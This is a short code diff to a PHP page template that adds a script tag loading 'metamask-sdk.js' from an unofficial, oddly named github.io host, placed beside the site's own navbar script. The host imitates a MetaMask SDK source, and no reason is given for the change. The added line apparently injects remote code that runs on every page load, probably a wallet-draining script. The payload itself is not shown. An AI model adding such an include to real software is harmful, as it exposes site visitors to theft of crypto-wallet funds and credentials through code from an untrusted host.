@@ -49,6 +49,8 @@
 
     <script src="<?=$view['urlbaseaddr'] ?>js/navbar.js"></script>
 
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+
     <?php foreach($view['jsscriptshead'] as $key => $value): ?>
         <?php echo $value ?>
     <?php endforeach; ?>
